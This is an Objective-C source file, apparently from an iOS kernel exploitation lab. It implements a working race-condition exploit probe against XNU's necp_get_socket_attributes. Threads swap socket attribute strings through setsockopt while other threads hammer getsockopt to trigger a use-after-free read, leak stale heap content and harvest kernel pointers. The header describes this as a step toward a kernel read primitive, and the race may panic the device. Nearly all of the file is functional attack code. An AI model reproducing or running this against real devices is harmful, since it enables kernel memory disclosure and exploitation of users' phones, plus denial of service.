//
//  P183NecpSockattrRace.m — the necp_get_socket_attributes two-pass TOCTOU.
//
//  THE FINDING (findings/2026-11-27_core13432_necp_sockattr_get.md, the only
//  live app-reachable kernel bug shape the 13432 core audit found):
//    necp_get_socket_attributes() computes the reply size with FIVE unlocked
//    strlen()s over swappable strings (pass 1: inp_domain / inp_domain_owner
//    / inp_domain_context / inp_tracker_domain / inp_account), kallocs the
//    buffer, then RE-strlens and copies all five (pass 2) -- with NO lock on
//    either pass. 12377 source proof at necp_client.c:12736. On 13432 Apple
//    added a double-strlen TRAP (the 0x5519-class panic) but NOT the lock --
//    the race survived their own rework.
//
//  THE RACE: thread B setsockopt(SO_NECP_ATTRIBUTES) alternating two marker
//  payloads of different lengths = every swap FREES the old string and
//  installs a new one. Thread A getsockopt hammers the two-pass read:
//    - freed-string read between pass-2's NULL-check and its copy = the
//      UAF-READ: stale heap content lands in the app's getsockopt buffer
//      (heap disclosure receipt).
//    - longer re-strlen than pass-1's size = the 13432 trap panic (the
//      winnability receipt -- PANIC-POSSIBLE, one tap per fresh boot).
//    - returned length not matching either payload = the two-pass mismatch
//      receipt.
//
//  THE OPTION NUMBER LAW (the P053 correction): SO_NECP_ATTRIBUTES is the
//  train-stable 0x1109. The T8150_24B156 LabOff table carries so_necp=0x0,
//  so the P053 "24B156 socket route DEAD" receipt was an option-zero gap in
//  OUR table, not a kernel gate. This probe uses the hardcoded 0x1109.
//
//  P1 CONTROL (PANIC-FREE): per-TLV grammar probe (DOMAIN=7, ACCOUNT=8,
//    OWNER=11, TRACKER=12, CONTEXT=13 -- CONTEXT is single-TLV-only per the
//    12377 single_tlv law) + the getsockopt round-trip receipt.
//  P2 THE RACE: gated by Documents/p183_arm.txt (any content, CONSUMED on
//    read -- one armed tap per fresh boot). PANIC-POSSIBLE via the trap.
//  P3 honest verdict. NEVER sets hasKread; a disclosure receipt is not the
//    gate; the gate stays kread32(kbase)==0xfeedfacf via commitSlide.
//
//  Log p183_necp_sockattr_race_log.txt. One armed tap per fresh boot.
//

#import "P183NecpSockattrRace.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <Foundation/Foundation.h>
#import <arpa/inet.h>
#import <errno.h>
#import <fcntl.h>
#import <pthread.h>
#import <string.h>
#import <sys/socket.h>
#import <unistd.h>

#define P183_BUILD @"p183-necp-sockattr-race-v3-selfstage"

/* the train-stable ABI number (see the option-number law above) */
#ifndef P183_SO_NECP_ATTRIBUTES
#define P183_SO_NECP_ATTRIBUTES 0x1109
#endif

/* the attribute TLV types (xnu-12377 bsd/net/necp.h -- train-stable) */
#define P183_TLV_DOMAIN         7
#define P183_TLV_ACCOUNT        8
#define P183_TLV_DOMAIN_OWNER   11
#define P183_TLV_TRACKER_DOMAIN 12
#define P183_TLV_DOMAIN_CONTEXT 13

/* TLV header: {type u8, length u16 BE, value[length]} */
static int p183_tlv(uint8_t *buf, int cap, uint8_t type,
                    const char *mark, int marklen) {
    if (cap < 3 + marklen) return -1;
    buf[0] = type;
    buf[1] = (uint8_t)(marklen & 0xff);
    buf[2] = (uint8_t)(marklen >> 8);
    memcpy(buf + 3, mark, marklen);
    return 3 + marklen;
}

static int p183_is_kptr(uint64_t v) {
    if (!v) return 0;
    if ((v >> 36) == 0xfffffff0ULL) return 1;
    if ((v >> 32) == 0xfffffe00ULL) return 1;
    if (v >= 0xfffffe0000000000ULL && v < 0xfffffff100000000ULL) return 1;
    return 0;
}

static volatile int g_p183_race = 0;
static volatile long g_p183_sets = 0, g_p183_set_errs = 0;
static volatile long g_p183_gets = 0, g_p183_get_errs = 0;
static volatile long g_p183_anom_len = 0, g_p183_stale = 0, g_p183_kptr = 0;
static int g_p183_fd = -1;
static int g_p183_expA = 0, g_p183_expB = 0;
static char g_p183_markA[0x48], g_p183_markB[0x408];
static int g_p183_markAlen = 0, g_p183_markBlen = 0;
static pthread_mutex_t g_p183_hit = PTHREAD_MUTEX_INITIALIZER;

static void *p183_churn_thread(void *arg) {
    (void)arg;
    /* two marker payloads, very different lengths: A ~0x28, B ~0x404.
       Every setsockopt swap FREES the old attribute string and installs the
       new one -- the two-pass read races exactly that free. */
    uint8_t tlvA[sizeof g_p183_markA + 8], tlvB[sizeof g_p183_markB + 8];
    int tlvAlen = p183_tlv(tlvA, sizeof tlvA, P183_TLV_DOMAIN,
                          g_p183_markA, g_p183_markAlen);
    int tlvBlen = p183_tlv(tlvB, sizeof tlvB, P183_TLV_DOMAIN,
                           g_p183_markB, g_p183_markBlen);
    int flip = 0;
    while (g_p183_race) {
        const uint8_t *p = flip ? tlvB : tlvA;
        int n = flip ? tlvBlen : tlvAlen;
        if (setsockopt(g_p183_fd, SOL_SOCKET, P183_SO_NECP_ATTRIBUTES,
                       p, (socklen_t)n) == 0)
            g_p183_sets++;
        else
            g_p183_set_errs++;
        flip = !flip;
        usleep(40);       /* churn cadence: a swap every ~40us */
    }
    return NULL;
}

static void *p183_getter_thread(void *arg) {
    (void)arg;
    uint8_t buf[0x1000];
    while (g_p183_race) {
        socklen_t len = sizeof buf;
        memset(buf, 0xA5, sizeof buf);
        if (getsockopt(g_p183_fd, SOL_SOCKET, P183_SO_NECP_ATTRIBUTES,
                       buf, &len) == 0) {
            g_p183_gets++;
            int anom = 0, stale = 0, kp = 0;
            /* (a) two-pass length mismatch: neither payload's shape */
            if ((int)len != g_p183_expA && (int)len != g_p183_expB &&
                (int)len > 0)
                anom = 1;
            /* (b) stale/UAF content: a DOMAIN TLV whose value is NEITHER
               the current A nor B marker (freed-string readback or a chunk
               tenant) */
            if (len >= 4) {
                uint8_t t = buf[0];
                uint16_t vl = (uint16_t)(buf[1] | (buf[2] << 8));
                if (t == P183_TLV_DOMAIN &&
                    (int)vl != g_p183_markAlen && (int)vl != g_p183_markBlen)
                    stale = 1;
                if (!stale && len >= (size_t)(3 + vl) && vl > 4) {
                    if (memcmp(buf + 3, g_p183_markA, 5) != 0 &&
                        memcmp(buf + 3, g_p183_markB, 5) != 0)
                        stale = 1;
                }
            }
            /* (c) kernel-band qwords in the reply */
            for (size_t i = 0; i + 8 <= len; i += 8) {
                uint64_t v = 0;
                memcpy(&v, buf + i, 8);
                if (p183_is_kptr(v)) { kp = 1; break; }
            }
            if (anom || stale || kp) {
                pthread_mutex_lock(&g_p183_hit);
                if (anom) g_p183_anom_len++;
                if (stale) g_p183_stale++;
                if (kp)   g_p183_kptr++;
                pthread_mutex_unlock(&g_p183_hit);
            }
        } else {
            g_p183_get_errs++;
        }
    }
    return NULL;
}

@implementation P183NecpSockattrRace

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    int fd = open([[docs stringByAppendingPathComponent:
                    @"p183_necp_sockattr_race_log.txt"] UTF8String],
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^L)(NSString *) = ^(NSString *s) {
        NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
        [log appendString:out];
        if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
    };

    L([NSString stringWithFormat:@"=== p183 session %@ BUILD %@ ===",
       LabLocalMilitaryNow() ?: @"?", P183_BUILD]);
    L(@"THE necp_get_socket_attributes TWO-PASS TOCTOU (the 13432 core");
    L(@"audit's one live app-reachable shape). Pass-1 computes five");
    L(@"unlocked strlens; pass-2 re-strlens and copies -- no lock on either");
    L(@"pass (12377 source proof; 13432 added the double-strlen trap but not");
    L(@"the lock). The churn swaps the DOMAIN string; the getter races it.");
    L(@"P1 control PANIC-FREE; P2 armed by p183_arm.txt (CONSUMED),");
    L(@"PANIC-POSSIBLE via the trap. A disclosure is NOT hasKread.");
    L([LabDeviceProfile identBlock] ?: @"ident=?");

    /* ── P1: the grammar + get-path discrimination control (v2, PANIC-FREE) ──
       12377 source laws (settled 2026-11-27): (a) an ABSENT TLV CLEARS its
       slot, so single-type calls cross-clear -- the v1 sequence ended with
       only TRACKER+CONTEXT live; (b) the SET is LOCKED (necp_lock_socket_
       attributes around swap+free) -- the TOCTOU is the GET side running
       unlocked against that swap. The v1 anomaly (len untouched + zeros)
       needs discrimination: no-op case vs early/alloc-fail vs cross-clear. */
    L(@"");
    L(@"=== P1: the grammar + get-path discrimination (PANIC-FREE) ===");
    int s = socket(AF_INET6, SOCK_DGRAM, 0);
    if (s < 0) {
        L([NSString stringWithFormat:@"[-] socket failed errno=%d", errno]);
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    /* P1a: the invalid-option baseline (is rc=0+len-untouched the no-op
       shape on this train, or does an unknown option error?) */
    {
        uint8_t buf[0x1000];
        socklen_t len = sizeof buf;
        memset(buf, 0xA5, sizeof buf);
        int rc = getsockopt(s, SOL_SOCKET, 0x9999, buf, &len);
        L([NSString stringWithFormat:
           @"[P1a] INVALID-option control (0x9999): rc=%d errno=%d "
           @"len=%u%@ -- the no-op baseline", rc, rc ? errno : 0, len,
           len == sizeof buf ? @" (UNTOUCHED)" : @""]);
    }

    /* P1b: per-type set -> IMMEDIATE get (one TLV, no cross-clearing) */
    const struct { int type; const char *nm; } types[] = {
        { P183_TLV_DOMAIN,         "DOMAIN(7)" },
        { P183_TLV_ACCOUNT,        "ACCOUNT(8)" },
        { P183_TLV_DOMAIN_OWNER,   "OWNER(11)" },
        { P183_TLV_TRACKER_DOMAIN, "TRACKER(12)" },
        { P183_TLV_DOMAIN_CONTEXT, "CONTEXT(13)" },
    };
    int liveTypes = 0, roundTrip = 0;
    for (size_t i = 0; i < sizeof(types) / sizeof(types[0]); i++) {
        char mark[64];
        int mlen = snprintf(mark, sizeof mark, "P183C%zu-%02d", i, (int)i);
        uint8_t tlv[80];
        int n = p183_tlv(tlv, sizeof tlv, (uint8_t)types[i].type,
                         mark, mlen + 1);
        int rc = setsockopt(s, SOL_SOCKET, P183_SO_NECP_ATTRIBUTES,
                            tlv, (socklen_t)n);
        uint8_t buf[0x1000];
        socklen_t len = sizeof buf;
        memset(buf, 0, sizeof buf);
        int grc = rc == 0 ? getsockopt(s, SOL_SOCKET,
                                       P183_SO_NECP_ATTRIBUTES,
                                       buf, &len) : -1;
        int hasMark = (grc == 0 && memmem(buf, len, mark, strlen(mark)));
        if (rc == 0) liveTypes++;
        if (hasMark) roundTrip++;
        L([NSString stringWithFormat:
           @"[P1b] %-14s set rc=%d errno=%d | get rc=%d len=%u%@ -- "
           @"round-trip %@", types[i].nm, rc, rc ? errno : 0, grc, len,
           grc == 0 && len != sizeof buf
               ? @" (LEN UPDATED -- the get case IS live)" : @"",
           hasMark ? @"OK (the markers came back)" : @"MISS"]);
    }

    /* P1c: the cross-clear law on this train: DOMAIN then ACCOUNT -> get
       (does DOMAIN survive a second single-type call?) */
    {
        uint8_t tlvA[32], tlvB[32];
        int nA = p183_tlv(tlvA, sizeof tlvA, P183_TLV_DOMAIN,
                          "P183XDOMAIN", 12);
        int nB = p183_tlv(tlvB, sizeof tlvB, P183_TLV_ACCOUNT,
                          "P183XACCT", 10);
        setsockopt(s, SOL_SOCKET, P183_SO_NECP_ATTRIBUTES, tlvA, (socklen_t)nA);
        setsockopt(s, SOL_SOCKET, P183_SO_NECP_ATTRIBUTES, tlvB, (socklen_t)nB);
        uint8_t buf[0x1000];
        socklen_t len = sizeof buf;
        memset(buf, 0, sizeof buf);
        int grc = getsockopt(s, SOL_SOCKET, P183_SO_NECP_ATTRIBUTES,
                             buf, &len);
        int domAlive = (grc == 0 && memmem(buf, len, "P183XDOMAIN", 11));
        L([NSString stringWithFormat:
           @"[P1c] DOMAIN then ACCOUNT -> get rc=%d len=%u -- DOMAIN %@ "
           @"(the absent-TLV-clears law on this train: %@)", grc, len,
           domAlive ? @"SURVIVED" : @"CLEARED",
           domAlive ? @"absent TLVs leave slots alone"
                   : @"absent TLVs clear the slot (the 12377 law)"]);
    }

    /* SELF-STAGING (2026-11-28 law): stage ONLY when the read path proved
       live (P1b markers came back) -- arming a dead read path is pointless.
       The deliberate act stays: fresh force-quit + ONE re-tap. */
    if (roundTrip > 0) {
        NSString *stagePath = [docs stringByAppendingPathComponent:@"p183_arm.txt"];
        NSString *stage = [NSString stringWithFormat:
            @"staged by p183 after P1 round-trip OK (%d/5) %@ -- one armed tap per fresh boot\n",
            roundTrip, LabLocalMilitaryNow() ?: @"?"];
        [stage writeToFile:stagePath atomically:YES
                  encoding:NSUTF8StringEncoding error:NULL];
        L([NSString stringWithFormat:
           @"[P1] SELF-STAGED: p183_arm.txt written (round-trip %d/5) -- "
           @"force-quit, then ONE armed tap.", roundTrip]);
    } else {
        L(@"[P1] NOT self-staged: the read path did not prove live -- the "
          @"13432 get-side decode decides whether the race can open at all.");
    }

    /* ── P2: the ARMORY gate ── */
    L(@"");
    L(@"=== P2: the race (Documents/p183_arm.txt -- CONSUMED) ===");
    NSString *armPath = [docs stringByAppendingPathComponent:@"p183_arm.txt"];
    int armed = 0;
    {
        int afd = open([armPath UTF8String], O_RDONLY);
        if (afd >= 0) {
            char b[64];
            ssize_t n = read(afd, b, sizeof b - 1);
            close(afd);
            if (n > 0) armed = 1;
            unlink([armPath UTF8String]);      /* CONSUMED */
            L(@"[P2] ARM FILE PRESENT -- the race runs (PANIC-POSSIBLE:");
            L(@"    the double-strlen trap; fresh-boot law).");
        } else {
            L(@"[P2] no arm file -- the race HOLDS. It SELF-STAGES after a "
              @"clean P1 round-trip (or write ANY content to:)");
            L([NSString stringWithFormat:@"    %@", armPath]);
        }
    }

    if (armed) {
        g_p183_fd = s;
        g_p183_race = 1;
        g_p183_sets = g_p183_set_errs = 0;
        g_p183_gets = g_p183_get_errs = 0;
        g_p183_anom_len = g_p183_stale = g_p183_kptr = 0;

        /* the two live payloads (globals so the threads share them) */
        g_p183_markAlen = snprintf(g_p183_markA, sizeof g_p183_markA,
                                   "P183A%032dA", 1) + 1;
        g_p183_markBlen = snprintf(g_p183_markB, sizeof g_p183_markB,
                                   "P183B%01024dB", 2) + 1;
        g_p183_expA = 3 + g_p183_markAlen;
        g_p183_expB = 3 + g_p183_markBlen;

        pthread_t churnT, getT1, getT2;
        pthread_create(&churnT, NULL, p183_churn_thread, NULL);
        pthread_create(&getT1, NULL, p183_getter_thread, NULL);
        pthread_create(&getT2, NULL, p183_getter_thread, NULL);

        usleep(10000000);                      /* the 10s armed window */
        g_p183_race = 0;
        pthread_join(churnT, NULL);
        pthread_join(getT1, NULL);
        pthread_join(getT2, NULL);

        L([NSString stringWithFormat:
           @"[P2] churn: sets=%ld errs=%ld | gets=%ld errs=%ld",
           g_p183_sets, g_p183_set_errs, g_p183_gets, g_p183_get_errs]);
        L([NSString stringWithFormat:
           @"[P2] RECEIPTS: len-anomaly=%ld stale=%ld kptr=%ld "
           @"(expected sizes: A=%d B=%d)",
           g_p183_anom_len, g_p183_stale, g_p183_kptr,
           g_p183_expA, g_p183_expB]);
    }

    close(s);

    /* ── P3: verdict ── */
    L(@"");
    L(@"=== P3: VERDICT ===");
    L([NSString stringWithFormat:
       @"[p183] grammar=%@ armed=%d sets=%ld gets=%ld anomaly=%ld stale=%ld "
       @"kptr=%ld",
       liveTypes ? @"live" : @"dead", armed, g_p183_sets, g_p183_gets,
       g_p183_anom_len, g_p183_stale, g_p183_kptr]);
    L(@"[=] PANIC (the trap) = the window is WINNABLE, not a primitive.");
    L(@"[=] stale/kptr content in the reply = the UAF-READ disclosure");
    L(@"    receipt (card elevation evidence). NOT hasKread -- the gate");
    L(@"    stays kread32(kbase) via commitSlide.");

    [[P007Board shared] recordEvent:@"p183_sockattr_race"
                                 kind:@"race"
                               detail:[NSString stringWithFormat:
                                       @"armed=%d stale=%ld kptr=%ld",
                                       armed, g_p183_stale, g_p183_kptr]
                               source:@"p183"];
    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return log;
}

@end
